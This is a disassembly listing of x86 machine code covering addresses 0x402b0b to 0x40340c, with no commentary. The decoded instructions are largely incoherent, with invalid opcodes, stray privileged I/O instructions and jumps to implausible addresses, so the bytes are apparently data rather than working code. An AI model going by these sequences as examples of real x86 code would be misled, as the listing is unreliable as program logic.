  402b0b:	dec    eax
  402b0c:	int    0x3b
  402b0e:	or     esi,DWORD PTR [ecx+eiz*4+0x36]
  402b12:	pop    es
  402b13:	pop    esp
  402b14:	les    edi,FWORD PTR [esp+ecx*1-0x18]
  402b18:	or     eax,0x4bffd135
  402b1d:	cmp    DWORD PTR [edi],edi
  402b1f:	dec    eax
  402b20:	int    0x3b
  402b22:	or     eax,DWORD PTR [eax]
  402b24:	mov    WORD PTR [ebx],?
  402b26:	mov    WORD PTR ds:0x4b836c,?
  402b2c:	mov    WORD PTR [edi-0x243e0119],es
  402b32:	inc    esp
  402b33:	inc    ecx
	...
  402b48:	mov    WORD PTR [ebx],fs
  402b4a:	ins    DWORD PTR es:[edi],dx
  402b4b:	stc    
  402b4c:	jmp    0x402b74
  402b4e:	leave  
  402b4f:	add    eax,0x4b736c
  402b54:	mov    WORD PTR [ebx],?
  402b56:	or     eax,DWORD PTR [eax]
  402b58:	add    DWORD PTR [ecx-0x39341024],edi
  402b5e:	cmp    al,0xe8
  402b60:	icebp  
  402b61:	retf   
  402b62:	sar    edi,1
  402b64:	or     DWORD PTR [ecx-0x6b4c1020],esi
  402b6a:	outs   dx,BYTE PTR ds:[esi]
  402b6b:	xor    al,0xb4
  402b6d:	repz push eax
  402b6f:	fldenv [ebx+0x3cd7a417]
  402b75:	mov    esp,0x944d4bcd
  402b7a:	fld    DWORD PTR ds:0xec61948c
  402b80:	in     al,dx
  402b81:	das    
  402b82:	loope  0x402b87
  402b84:	xchg   DWORD PTR [esi+edx*8+0x7e],edx
  402b88:	xlat   BYTE PTR ds:[ebx]
  402b89:	xchg   ebx,eax
  402b8a:	loope  0x402b8f
  402b8c:	push   ebx
  402b8d:	nop    ecx
  402b90:	arpl   WORD PTR [ebp-0x1f],ax
  402b93:	add    ecx,DWORD PTR [esp+edx*4+0x35547f2e]
  402b9a:	push   cs
  402b9b:	(bad)  [ebx-0x6b]
  402b9e:	loope  0x402ba3
  402ba0:	mov    dh,0x94
  402ba2:	mov    eax,DWORD PTR [ebx]
  402ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ba5:	xchg   esp,eax
  402ba6:	mov    eax,DWORD PTR [ebx]
  402ba8:	add    DWORD PTR [edi],ecx
  402baa:	jmp    0x402c97
	...
  402bbf:	add    BYTE PTR [ebx],ch
  402bc1:	inc    ebp
  402bc2:	xor    DWORD PTR [edi-0x2731b7f7],eax
  402bc8:	sbb    esp,esp
  402bca:	(bad)  
  402bcb:	mov    ds,WORD PTR [eax]
  402bcd:	xor    eax,0xbf0bd8ce
  402bd2:	mov    ch,0xeb
  402bd4:	stos   BYTE PTR es:[edi],al
  402bd5:	das    
  402bd6:	loope  0x402bdb
  402bd8:	xchg   DWORD PTR [esi+edx*8+0x7e],edx
  402bdc:	lahf   
  402bdd:	xchg   ebx,eax
  402bde:	loope  0x402be3
  402be0:	je     0x402be2
  402be2:	cmp    DWORD PTR [ebx-0x74],eax
  402be5:	mov    esp,0x944d4c05
  402bea:	mov    DWORD PTR [ecx-0x30],edx
  402bed:	inc    esp
  402bee:	mov    cs,WORD PTR [esp+ecx*8]
  402bf1:	xchg   esp,eax
  402bf2:	ins    DWORD PTR es:[edi],dx
  402bf3:	ror    BYTE PTR [esp+edx*4+0x6408e908],cl
  402bfa:	test   DWORD PTR [ebx+ebx*8+0x34],esp
  402bfe:	mul    DWORD PTR [esi+0x5f]
  402c01:	loop   0x402be3
  402c03:	call   0x94cf:0xe2f744bb
  402c0a:	mov    WORD PTR [ebx],?
  402c0c:	(bad)  
  402c0d:	xchg   esp,eax
  402c0e:	or     BYTE PTR [eax+0xa],dh
  402c11:	xor    eax,0x12643ee7
  402c16:	lea    eax,[ecx+0x64]
  402c19:	inc    esp
  402c1a:	neg    DWORD PTR [ecx-0x57bfe319]
  402c20:	pop    DWORD PTR [ebx-0x43]
  402c23:	or     DWORD PTR [eax],eax
	...
  402c35:	add    BYTE PTR [eax],al
  402c37:	add    BYTE PTR [esp+eax*2-0x9],dh
  402c3b:	adc    DWORD PTR [ecx+0x67690894],0x6406f2f3
  402c45:	nop
  402c46:	enter  0xc3ee,0xf9
  402c4a:	pop    es
  402c4b:	jmp    0xe93043df
  402c50:	test   BYTE PTR [edx],bl
  402c52:	xchg   esp,eax
  402c53:	jmp    0xde98c0e7
  402c58:	std    
  402c59:	sub    al,0xe7
  402c5b:	(bad)  
  402c5c:	inc    ebx
  402c5d:	in     eax,0xf7
  402c5f:	xchg   esp,eax
  402c60:	cmp    BYTE PTR [edi+esi*8],dh
  402c63:	xabort 0x7c
  402c66:	std    
  402c67:	mov    esi,0xc18d11db
  402c6c:	repz inc ebx
  402c6e:	neg    DWORD PTR [ecx]
  402c70:	pusha  
  402c71:	in     al,dx
  402c72:	aas    
  402c73:	sub    BYTE PTR [eax-0x147642bd],dl
  402c79:	inc    ebx
  402c7a:	test   DWORD PTR [ecx],0x6908948e
  402c80:	loopne 0x402c34
  402c82:	repz add BYTE PTR [edx],dl
  402c85:	ins    BYTE PTR es:[edi],dx
  402c86:	add    eax,eax
  402c88:	mov    ecx,0xdbd8b83
  402c8d:	cmp    al,0xf7
  402c8f:	jmp    DWORD PTR [ecx+edx*8+0xce55033]
  402c96:	(bad)  
  402c97:	cld    
  402c98:	push   edx
  402c99:	imul   esi,edi,0x50
	...
  402cb0:	dec    ebp
  402cb1:	dec    ecx
  402cb2:	jmp    0xd185:0x8587a500
  402cb9:	cmp    esi,edi
  402cbb:	jmp    DWORD PTR ds:0xd2ecbd6a
  402cc1:	imul   esi,edi,0xffffffe8
  402cc4:	mov    bl,0x64
  402cc6:	idiv   edi
  402cc8:	dec    ebp
  402cc9:	push   0xffffffbd
  402ccb:	call   0x51379862
  402cd0:	and    BYTE PTR ds:0x6b82efe4,0xe0
  402cd7:	fisttp DWORD PTR [ecx+0x6a]
  402cda:	imul   eax
  402cdc:	gs pop edi
  402cde:	idiv   edi
  402ce0:	mov    ?,WORD PTR [eax-0x7b]
  402ce3:	test   DWORD PTR [ecx],esp
  402ce5:	cmp    dh,bh
  402ce7:	jmp    DWORD PTR [ebp+0x30]
  402cea:	shl    dl,1
  402cec:	xor    eax,0xb0504897
  402cf1:	adc    al,0xf4
  402cf3:	out    dx,eax
  402cf4:	inc    edx
  402cf5:	push   0x58
  402cf7:	dec    DWORD PTR [eax+0x42ffe73b]
  402cfd:	das    
  402cfe:	mov    esp,0xe06a42f4
  402d03:	jmp    0x379742
  402d08:	dec    eax
  402d09:	aaa    
  402d0a:	out    0xff,eax
  402d0c:	add    ch,BYTE PTR [edi]
  402d0e:	(bad)  
  402d0f:	test   DWORD PTR [edx+ebp*1+0xffde],0x0
	...
  402d26:	add    BYTE PTR [eax],al
  402d28:	or     DWORD PTR [ecx],ebp
  402d2a:	out    dx,al
  402d2b:	dec    ebx
  402d2d:	and    eax,DWORD PTR [esi-0x213e3c02]
  402d33:	jne    0x402ced
  402d35:	adc    al,0xc6
  402d37:	jecxz  0x402cc5
  402d39:	sub    eax,0x1fab0061
  402d3e:	fucomi st,st(7)
  402d40:	mov    ds:0xa06fe3e1,eax
  402d45:	jmp    0xd2cc9828
  402d4a:	cwde   
  402d4b:	in     al,dx
  402d4c:	jnp    0x402d29
  402d4e:	fsubp  st(0),st
  402d50:	out    dx,al
  402d51:	xchg   esi,ebx
  402d53:	dec    DWORD PTR [ecx]
  402d55:	mov    cl,0xd7
  402d57:	out    dx,eax
  402d58:	jae    0x402dcd
  402d5a:	cmp    edi,edi
  402d5c:	and    DWORD PTR [esi+ebp*8+0x72a463ff],ebx
  402d63:	jecxz  0x402cf1
  402d65:	sub    ecx,DWORD PTR [eax-0x22092b40]
  402d6b:	mov    ch,0x3c
  402d6d:	stos   DWORD PTR es:[edi],eax
  402d6e:	fdivp  st(7),st
  402d70:	xor    al,0x10
  402d72:	out    dx,al
  402d73:	(bad)  
  402d74:	cmp    esi,DWORD PTR [ebp+0x3323e888]
  402d7a:	(bad)  
  402d7c:	loope  0x402de1
  402d7e:	in     eax,dx
  402d7f:	jmp    DWORD PTR [ebx]
  402d81:	neg    WORD PTR fs:[ebx]
  402d85:	imul   ebp,DWORD PTR [ecx+0xc6cc45c],0xffffffff
	...
  402da0:	inc    ecx
  402da1:	push   eax
  402da2:	in     eax,dx
  402da3:	inc    DWORD PTR [ebx]
  402da5:	fs inc ecx
  402da7:	loop   0x402d35
  402da9:	sub    eax,DWORD PTR [eax]
  402dab:	sar    BYTE PTR [eax+0x66],0x80
  402daf:	(bad)  
  402db0:	hlt    
  402db1:	xchg   esp,eax
  402db2:	sahf   
  402db3:	aad    0xe3
  402db5:	or     eax,0xe0998991
  402dba:	sub    DWORD PTR [ebx-0x74],eax
  402dbd:	inc    ebp
  402dbe:	dec    ebp
  402dbf:	aad    0x1
  402dc1:	cmp    DWORD PTR [esi-0x4cd33c2b],ebx
  402dc7:	loope  0x402d55
  402dc9:	xchg   esp,eax
  402dca:	ins    BYTE PTR es:[edi],dx
  402dcb:	jg     0x402d75
  402dcd:	xor    DWORD PTR [esi-0x2b],esp
  402dd0:	cmp    al,0x41
  402dd2:	xchg   esp,eax
  402dd3:	call   0xec966f8b
  402dd8:	push   esi
  402dd9:	xor    eax,0x550903e1
  402dde:	(bad)  [eax-0x75]
  402de1:	pop    es
  402de2:	pop    ebp
  402de3:	in     eax,0x83
  402de5:	inc    ecx
  402de6:	pop    ecx
  402de7:	or     DWORD PTR [ebx+0x41],ebp
  402dea:	mov    ecx,DWORD PTR ds:[ecx]
  402ded:	sub    al,0x36
  402def:	aad    0x6b
  402df1:	inc    ecx
  402df2:	push   esp
  402df3:	in     al,dx
  402df4:	jae    0x402e37
  402df6:	push   ss
  402df7:	in     al,dx
  402df8:	mov    eax,ds:0x2fd51e49
  402dfd:	mov    ah,0xa9
  402dff:	inc    edx
  402e00:	mov    WORD PTR [ecx+0x34],es
  402e03:	loopne 0x402e05
	...
  402e15:	add    BYTE PTR [eax],al
  402e17:	add    BYTE PTR [ebx],dh
  402e19:	inc    ecx
  402e1a:	imul   bl
  402e1c:	es xor esp,ecx
  402e1f:	add    eax,DWORD PTR [edi+0x16f87d54]
  402e25:	psubusw mm4,mm4
  402e28:	and    eax,DWORD PTR [ecx+0x7a]
  402e2b:	rol    DWORD PTR [edi],cl
  402e2d:	jg     0x402e70
  402e2f:	dec    esp
  402e30:	int    0x94
  402e32:	rcr    BYTE PTR [edi-0x1b3af8f5],cl
  402e38:	add    eax,DWORD PTR [ecx-0x27]
  402e3b:	mov    dl,0xed
  402e3d:	xchg   ebx,eax
  402e3e:	or     cl,ch
  402e40:	fadd   DWORD PTR [esi]
  402e42:	clc    
  402e43:	mov    esi,0xae040c0
  402e48:	jmp    0xe730:0xa9ef740
  402e4f:	xchg   esi,eax
  402e50:	mov    eax,0xe07f502b
  402e55:	inc    eax
  402e56:	push   edi
  402e57:	daa    
  402e58:	xlat   BYTE PTR ds:[ebx]
  402e59:	push   esp
  402e5a:	pop    ebp
  402e5b:	jb     0x402e10
  402e5d:	lods   eax,DWORD PTR ds:[esi]
  402e5e:	add    BYTE PTR [ecx+0x6ef749ad],al
  402e64:	adc    al,0x64
  402e66:	neg    DWORD PTR [esi+eax*1]
  402e69:	int3   
  402e6a:	dec    ecx
  402e6b:	jmp    0xdd37c480
  402e70:	xchg   DWORD PTR [ecx],edx
  402e72:	dec    edx
  402e73:	in     eax,0x16
  402e75:	stos   BYTE PTR es:[edi],al
  402e76:	mov    dl,0xb1
  402e78:	into   
  402e79:	xchg   esp,eax
  402e7a:	shr    DWORD PTR [ebx],0x0
	...
  402e8d:	add    BYTE PTR [eax],al
  402e8f:	add    BYTE PTR [ebx+0x40],bh
  402e92:	pop    esp
  402e93:	bound  ebp,QWORD PTR [ebx+0x14]
  402e96:	int3   
  402e97:	xor    DWORD PTR [eax-0x70deb2a9],edi
  402e9d:	xchg   esp,eax
  402e9e:	or     cl,ch
  402ea0:	or     al,0xc2
  402ea2:	add    cl,ch
  402ea4:	ret    
  402ea5:	mov    ds:0x3f9394f7,al
  402eaa:	jge    0x402e9d
  402eac:	mov    ch,0x94
  402eae:	loopne 0x402eac
  402eb0:	push   ebp
  402eb1:	inc    eax
  402eb2:	mul    DWORD PTR [eax+0x72]
  402eb5:	inc    eax
  402eb6:	jecxz  0x402e9e
  402eb8:	call   0x902a2396
  402ebd:	xchg   esp,eax
  402ebe:	or     BYTE PTR [edx+0x7d],dh
  402ec1:	cli    
  402ec2:	aas    
  402ec3:	sub    BYTE PTR [eax+0x55621b2b],cl
  402ec9:	inc    eax
  402eca:	xor    eax,DWORD PTR [eax]
  402ecc:	mov    dl,0x8c
  402ece:	jge    0x402ed9
  402ed0:	xor    cl,dh
  402ed2:	lock add ebp,esp
  402ed5:	xchg   ebx,eax
  402ed6:	or     bl,ch
  402ed8:	repz mov esi,0xde2a0b37
  402ede:	loope  0x402e63
  402ee0:	js     0x402f32
  402ee2:	or     BYTE PTR [ebp-0x13],dh
  402ee5:	bound  edi,QWORD PTR [ebp-0x4]
  402ee8:	or     eax,0xafff717
  402eed:	ror    BYTE PTR [ebp-0x8],0x9a
  402ef1:	add    edx,ecx
  402ef3:	or     BYTE PTR [eax],al
	...
  402f05:	add    BYTE PTR [eax],al
  402f07:	add    BYTE PTR [ebp+0x5f3d837a],ah
  402f0d:	or     BYTE PTR [ecx+0x0],0x3e
  402f11:	inc    eax
  402f12:	pop    esi
  402f13:	mov    edi,DWORD PTR [edx+0x60]
  402f16:	idiv   BYTE PTR ss:[edx]
  402f19:	arpl   WORD PTR [ebx],ax
  402f1b:	jmp    DWORD PTR [eax+0x67]
  402f1e:	iret   
  402f1f:	add    eax,0x49800f
  402f24:	gs xchg ebx,eax
  402f26:	or     BYTE PTR [eax],al
  402f28:	sbb    dl,BYTE PTR [esi+0x5d]
  402f2b:	mov    ebp,DWORD PTR [ecx+0x756a5e7b]
  402f31:	bound  edi,QWORD PTR [ebp+0x8]
  402f34:	jge    0x402f58
  402f36:	icebp  
  402f37:	(bad)  
  402f38:	jp     0x402ef9
  402f3a:	lock jmp DWORD PTR [eax]
  402f3d:	cmp    ebp,edi
  402f3f:	jmp    0x402ed6
  402f41:	cwde   
  402f42:	or     BYTE PTR [ebx+0xf7e998d],al
  402f48:	adc    dl,BYTE PTR [ebx]
  402f4a:	aaa    
  402f4b:	and    ah,BYTE PTR [eax-0x3d720cc5]
  402f51:	cdq    
  402f52:	or     eax,0x36
  402f55:	not    DWORD PTR [esi+0x68]
  402f58:	mov    WORD PTR [edi],fs
  402f5a:	xor    eax,DWORD PTR [ecx-0x74]
  402f5d:	xchg   ah,dl
  402f5f:	push   0xffffffee
  402f61:	sub    al,0xb
  402f63:	or     ecx,esp
  402f65:	mov    BYTE PTR [eax],al
  402f67:	(bad)  
  402f68:	dec    esp
  402f69:	xor    DWORD PTR [ebx],ecx
  402f6b:	push   0x0
	...
  402f7d:	add    BYTE PTR [eax],al
  402f7f:	add    BYTE PTR [eax-0x2d],cl
  402f82:	or     al,0x57
  402f84:	hlt    
  402f85:	(bad)  
  402f86:	out    dx,al
  402f87:	add    BYTE PTR [edx+eax*2-0x10768b35],cl
  402f8e:	or     al,BYTE PTR [eax]
  402f90:	mov    bh,0x29
  402f92:	rol    DWORD PTR [edi],0x8c
  402f95:	sahf   
  402f96:	aam    0xa8
  402f98:	lods   al,BYTE PTR ds:[esi]
  402f99:	sub    al,0xb
  402f9b:	xor    DWORD PTR [ecx+ebp*1+0x35d20352],0xb
  402fa3:	mov    ecx,ebx
  402fa5:	push   esi
  402fa6:	cmp    cl,cl
  402fa8:	into   
  402fa9:	cmp    BYTE PTR [ebx],cl
  402fab:	push   ebp
  402fac:	pop    es
  402fad:	(bad)  [esi+0x40b388c4]
  402fb3:	or     al,0x89
  402fb5:	sub    edi,ebx
  402fb7:	(bad)  
  402fb8:	jnp    0x402fd6
  402fba:	rol    ebp,cl
  402fbc:	jns    0x402f45
  402fbe:	fimul  DWORD PTR [ecx+0x75da6fd1]
  402fc4:	nop
  402fc5:	jbe    0x403017
  402fc7:	cld    
  402fc8:	pop    ebx
  402fc9:	sub    ebx,esi
  402fcb:	out    0x67,eax
  402fcd:	mov    eax,ds:0x294bffda
  402fd2:	sti    
  402fd3:	(bad)  
  402fd4:	mov    ecx,0x3875da47
  402fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fda:	lods   eax,DWORD PTR ds:[esi]
  402fdb:	or     DWORD PTR [ebx+ebp*1-0x6bd78a26],ecx
  402fe2:	xor    ch,0x0
	...
  402ff5:	add    BYTE PTR [eax],al
  402ff7:	add    BYTE PTR [ebx],ah
  402ff9:	xchg   ebp,eax
  402ffa:	out    dx,al
  402ffb:	mov    ebx,0x36e1914e
  403000:	pop    es
  403001:	xor    DWORD PTR [edi],esi
  403003:	xor    eax,0xfc5c3d63
  403008:	jmp    0x403025
  40300a:	rol    DWORD PTR [esp+ecx*4],0x24
  40300e:	cli    
  40300f:	ret    
  403010:	jns    0x402fa7
  403012:	push   ds
  403013:	sub    eax,0xfca34b4a
  403018:	jecxz  0x403024
  40301a:	sub    al,0xfc
  40301c:	or     ecx,DWORD PTR [edx]
  40301e:	leave  
  40301f:	je     0x403028
  403021:	enter  0x1ced,0xcc
  403025:	inc    eax
  403026:	pop    eax
  403027:	rol    ebx,1
  403029:	cmp    eax,0xeebe748e
  40302e:	push   eax
  40302f:	test   BYTE PTR [ebx-0x6c],dh
  403032:	cmc    
  403033:	jmp    0x94ac:0x5389e142
  40303a:	loope  0x403038
  40303c:	fcmovnb st,st(7)
  40303e:	out    dx,al
  40303f:	xor    BYTE PTR [edi],dh
  403041:	fisubr WORD PTR [eax]
  403043:	(bad)  
  403044:	xchg   esp,eax
  403045:	xchg   esp,eax
  403046:	push   0xe5560f0a
  40304b:	fsub   QWORD PTR [edx-0x4]
  40304e:	fild   WORD PTR [ebx]
  403050:	mov    WORD PTR [esi+ebx*4+0x234bca2c],ss
  403057:	cld    
  403058:	arpl   WORD PTR [ebp+0x3c9b],si
	...
  40306e:	add    BYTE PTR [eax],al
  403070:	int    0x94
  403072:	cdq    
  403073:	dec    eax
  403074:	(bad)
  403077:	(bad)  [ebx]
  403079:	cmp    eax,0x2b4d106
  40307e:	mov    edx,0x69ac8c42
  403083:	ds int 0x94
  403086:	or     BYTE PTR [ecx],al
  403088:	test   al,0x3d
  40308a:	imul   esi
  40308c:	(bad)  
  40308d:	scas   al,BYTE PTR es:[edi]
  40308e:	inc    ebx
  40308f:	sub    BYTE PTR [eax-0x30cf9654],dl
  403095:	xchg   esp,eax
  403096:	loopne 0x4030e8
  403098:	fnstsw WORD PTR [edi+esi*8]
  40309b:	inc    ecx
  40309c:	in     al,dx
  40309d:	enter  0xe949,0x57
  4030a1:	dec    esi
  4030a2:	inc    ebx
  4030a3:	sub    BYTE PTR [eax-0x43499dd4],cl
  4030a9:	cmp    al,0x60
  4030ab:	dec    ebx
  4030ac:	mov    eax,ds:0xdc1108d3
  4030b1:	retf   
  4030b2:	dec    ecx
  4030b3:	jmp    0x9738096f
  4030b8:	fsubr  QWORD PTR [ebx-0x6bb0ddae]
  4030be:	pusha  
  4030bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c0:	ja     0x403095
  4030c2:	or     BYTE PTR [ecx+0x76f73d73],dl
  4030c8:	inc    edi
  4030c9:	push   esi
  4030ca:	inc    ebx
  4030cb:	sub    BYTE PTR [eax+0x4eb212ac],cl
  4030d1:	xchg   esp,eax
  4030d2:	loopne 0x4030f0
	...
  4030e8:	mov    ebp,0x49c1f73c
  4030ed:	ror    BYTE PTR [ecx-0x17],1
  4030f0:	out    0x7c,eax
  4030f2:	inc    ebx
  4030f3:	test   al,0x8f
  4030f5:	sub    al,0x26
  4030f7:	ds pop esp
  4030f9:	cmp    al,0xcb
  4030fb:	pushf  
  4030fc:	call   0x67e4b429
  403101:	(bad)
  403105:	adc    al,0x30
  403107:	jmp    0xe9f0bec6
  40310c:	(bad)  
  40310d:	xchg   esp,eax
  40310e:	or     BYTE PTR [eax],ah
  403110:	dec    ecx
  403111:	xchg   ecx,eax
  403112:	or     BYTE PTR [eax],al
  403114:	pop    esi
  403115:	add    ah,bl
  403117:	pop    ss
  403118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403119:	(bad)  
  40311a:	push   esp
  40311b:	je     0x403155
  40311d:	sbb    BYTE PTR [eax],dh
  40311f:	das    
  403120:	cwde   
  403121:	mov    WORD PTR [edx+0x8982501],?
  403127:	jmp    0x403151
  403129:	push   cs
  40312a:	or     BYTE PTR [eax],al
  40312c:	cmc    
  40312d:	xchg   edi,eax
  40312e:	dec    eax
  40312f:	sbb    BYTE PTR [ebp+0x7ee47d90],0x56
  403136:	rol    edx,0xe9
  403139:	xchg   edi,eax
  40313a:	pop    ebp
  40313b:	mov    edx,ecx
  40313d:	sbb    DWORD PTR [esi+0x53],0x6e
  403141:	int    0x4
  403143:	add    eax,0x893e5
  403148:	adc    al,0x31
  40314a:	pop    eax
  40314b:	call   0x403150
	...
  403160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403161:	pop    esp
  403162:	idiv   edi
  403164:	cs dec eax
  403166:	sbb    eax,0x3e
  403169:	fld    QWORD PTR [eax]
  40316b:	mov    esp,DWORD PTR [eax-0x6c]
  40316e:	jecxz  0x403172
  403170:	pop    ecx
  403171:	jns    0x403176
  403173:	leave  
  403174:	cdq    
  403175:	mov    WORD PTR [eax-0x22360c2],cs
  40317b:	or     ebx,DWORD PTR [esp+ebx*8+0xa]
  40317f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403180:	sub    al,0x9e
  403182:	enter  0xe8aa,0xf9
  403186:	jl     0x40316e
  403188:	(bad)  
  403189:	push   edi
  40318a:	push   ebx
  40318b:	pop    esi
  40318c:	adc    bh,al
  40318e:	leave  
  40318f:	or     BYTE PTR [ebp-0x7a],dh
  403192:	pop    esi
  403193:	mov    ecx,0x89769
  403198:	aad    0xa7
  40319a:	ficom  DWORD PTR [eax-0x536811ca]
  4031a0:	mov    WORD PTR [ebp-0x42b34a09],?
  4031a6:	sbb    BYTE PTR [ebx],ch
  4031a8:	sbb    al,0xb8
  4031aa:	or     eax,0x66f0f90
  4031af:	nop
  4031b0:	iret   
  4031b1:	add    DWORD PTR [esi],edx
  4031b3:	nop
  4031b4:	cdq    
  4031b5:	xor    edi,DWORD PTR [ebx-0x7d]
  4031b8:	dec    esi
  4031b9:	jb     0x403237
  4031bb:	inc    ebx
  4031bc:	push   eax
  4031bd:	popf   
  4031be:	jl     0x40323c
  4031c0:	xchg   esi,eax
  4031c1:	mov    eax,ds:0x9005
	...
  4031d6:	add    BYTE PTR [eax],al
  4031d8:	xor    DWORD PTR [eax],0xf
  4031db:	add    al,0x8f
  4031dd:	sbb    eax,0xdd4d3c4a
  4031e2:	inc    edi
  4031e3:	or     ebp,DWORD PTR [eax-0x75808359]
  4031e9:	cmp    DWORD PTR [eax+edx*4-0x71],ecx
  4031ed:	std    
  4031ee:	dec    ecx
  4031ef:	cmp    al,0x6d
  4031f1:	mov    ebp,0xa7880a47
  4031f6:	jl     0x403277
  4031f8:	mov    ecx,edi
  4031fa:	dec    ebp
  4031fb:	add    ebx,esp
  4031fd:	ins    DWORD PTR es:[edi],dx
  4031fe:	int    0xc2
  403200:	mov    cl,BYTE PTR [edi]
  403202:	pushf  
  403203:	rcl    esi,0x2a
  403206:	jb     0x4031ca
  403208:	xchg   ebx,eax
  403209:	cmc    
  40320a:	retf   
  40320b:	call   0x8bbb3894
  403210:	(bad)  
  403211:	mov    esp,0xf94f5b25
  403216:	jno    0x403204
  403218:	fild   WORD PTR [edx]
  40321a:	cmp    eax,0xf2f907fc
  40321f:	pop    DWORD PTR [edi]
  403221:	stc    
  403222:	cli    
  403223:	(bad)  
  403224:	pop    ss
  403225:	icebp  
  403226:	test   BYTE PTR [edi+0x22eaa69f],0xfc
  40322d:	xchg   esp,eax
  40322e:	mov    al,0x73
  403230:	fs (bad) 
  403232:	push   ss
  403233:	into   
  403234:	dec    ebx
  403235:	and    eax,0x8cc2bc64
  40323a:	dec    ebx
  40323b:	les    eax,FWORD PTR [eax]
	...
  40324d:	add    BYTE PTR [eax],al
  40324f:	add    BYTE PTR [ecx*4+0x3d2e4251],ah
  403256:	push   ecx
  403257:	sub    al,0xfc
  403259:	adc    eax,0x15fc0727
  40325e:	or     BYTE PTR [edi],al
  403260:	cld    
  403261:	mov    ecx,0x560774cf
  403266:	jno    0x403296
  403268:	imul   ebx,ebp,0xffffffa8
  40326b:	ret    0x9490
  40326e:	cmp    al,0x79
  403270:	call   0xf320d788
  403275:	cmp    DWORD PTR [esi+0x6c5db731],esi
  40327b:	inc    edi
  40327c:	loopne 0x403262
  40327e:	dec    ecx
  40327f:	rol    DWORD PTR [ebx+edx*8-0x1f],0xcc
  403284:	cdq    
  403285:	pop    esp
  403286:	cmp    DWORD PTR [ebx-0x74],eax
  403289:	sub    al,0x7b
  40328b:	lods   eax,DWORD PTR ds:[esi]
  40328c:	mov    WORD PTR [edx+ebp*8-0x7189be3d],ss
  403293:	push   edi
  403294:	pushf  
  403295:	cmp    esp,edi
  403297:	push   DWORD PTR ds:0xa3040b95
  40329d:	mov    edi,0x3821cce9
  4032a2:	pop    ecx
  4032a3:	test   DWORD PTR [ebx+0x4bf8e194],esi
  4032a9:	mov    edi,0xbf8340e0
  4032ae:	inc    ebp
  4032af:	fsub   st(6),st
  4032b1:	pop    ecx
  4032b2:	loope  0x4032b7
	...
  4032c8:	xchg   DWORD PTR [ebp-0x1a],ebx
  4032cb:	xchg   BYTE PTR [ecx-0x6c],dl
  4032ce:	or     cl,ch
  4032d0:	pop    DWORD PTR [edi]
  4032d2:	lea    edi,[edx]
  4032d4:	dec    edx
  4032d5:	cmp    edi,esi
  4032d7:	mov    ecx,0xe90990b7
  4032dc:	(bad)  
  4032dd:	sub    al,0x45
  4032df:	aaa    
  4032e0:	mov    BYTE PTR [ebx+eax*1-0x5beac6d7],dl
  4032e7:	jmp    0xe575c77b
  4032ec:	mov    ss,WORD PTR [eax+ecx*1+0x7f308e6]
  4032f3:	jmp    0x7448e187
  4032f8:	or     al,BYTE PTR [ebp-0xa]
  4032fb:	(bad)  
  4032fd:	jecxz  0x4032df
  4032ff:	sbb    esi,DWORD PTR [edx]
  403301:	xchg   esp,eax
  403302:	or     BYTE PTR [edx+edx*1+0x45],bl
  403306:	test   dh,0xc0
  403309:	jecxz  0x4032eb
  40330b:	sub    edx,ebx
  40330d:	cmp    bh,dh
  40330f:	loop   0x4032e0
  403311:	mov    esi,0xcbf44114
  403316:	dec    ecx
  403317:	jmp    0xa03b426e
  40331c:	fdivr  DWORD PTR [eax]
  40331e:	pop    eax
  40331f:	adc    DWORD PTR [ebp+0x42],0xbec88ef7
  403326:	add    BYTE PTR [ecx],bl
  403328:	ror    BYTE PTR [esi-0x2],1
  40332b:	jle    0x40332d
	...
  40333d:	add    BYTE PTR [eax],al
  40333f:	add    al,bl
  403341:	sub    al,0x7
  403343:	jbe    0x40337f
  403345:	mov    WORD PTR [ebp-0x8c6439c],es
  40334b:	pop    di
  40334d:	sub    al,0x68
  40334f:	push   edi
  403350:	pop    eax
  403351:	cmp    BYTE PTR [ecx-0x8c89c94],al
  403357:	dec    esi
  403358:	aad    0x94
  40335a:	bound  eax,QWORD PTR [eax]
  40335c:	fimul  WORD PTR gs:[edx]
  40335f:	push   0x75
  403361:	fimul  WORD PTR [ebx]
  403363:	push   0xc0089475
  403368:	stos   BYTE PTR es:[edi],al
  403369:	push   ds
  40336a:	in     al,0xfe
  40336c:	stos   BYTE PTR es:[edi],al
  40336d:	dec    eax
  40336e:	loopne 0x4033cf
  403370:	mov    BYTE PTR [ebx+0x4bf08908],dl
  403376:	dec    eax
  403377:	je     0x4033b6
  403379:	dec    ecx
  40337a:	jge    0x40338c
  40337c:	mov    bl,dh
  40337e:	add    al,0xff
  403380:	mov    al,ds:0x88f7e04b
  403385:	dec    eax
  403386:	test   DWORD PTR [ebx-0x782b783],0xd57e3d
  403390:	cmc    
  403391:	shl    BYTE PTR ss:[ebp-0x12],cl
  403395:	dec    edx
  403396:	mov    ebp,0xf74bcbec
  40339b:	call   0x482115
  4033a0:	sub    ah,BYTE PTR [esi]
  4033a2:	in     al,0xfe
	...
  4033b8:	sbb    cl,BYTE PTR [eax+eiz*8+0x69]
  4033bc:	pop    ss
  4033bd:	dec    esp
  4033be:	test   DWORD PTR [ebx-0x3d3e97da],0x8b5d93b9
  4033c8:	or     DWORD PTR [edx],edx
  4033ca:	int3   
  4033cb:	in     al,dx
  4033cc:	or     ecx,DWORD PTR [edi+esi*8+0x53]
  4033d0:	or     ah,dh
  4033d2:	add    al,0xff
  4033d4:	mov    al,ds:0x6dc36f3b
  4033d9:	ror    DWORD PTR [eax],1
  4033db:	jmp    eax
  4033dd:	jmp    0x40341e
  4033df:	inc    ecx
  4033e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033e1:	pop    ebx
  4033e2:	push   edx
  4033e3:	cmc    
  4033e4:	jmp    0x882e:0x8cc0034b
  4033eb:	fimul  DWORD PTR [ebp+ebp*1-0x3fa8d4f5]
  4033f2:	mov    edi,ebp
  4033f4:	push   0x76
  4033f6:	ret    
  4033f7:	push   eax
  4033f8:	hlt    
  4033f9:	sub    DWORD PTR [eax+eax*1],ecx
  4033fc:	mov    ebp,ss
  4033fe:	cmp    ebx,ebp
  403400:	mov    WORD PTR ds:0xb19bbff6,gs
  403406:	add    DWORD PTR [eax],0x4002d8c
  40340c:	lea    ebp,ds:0x7b0b0f0b
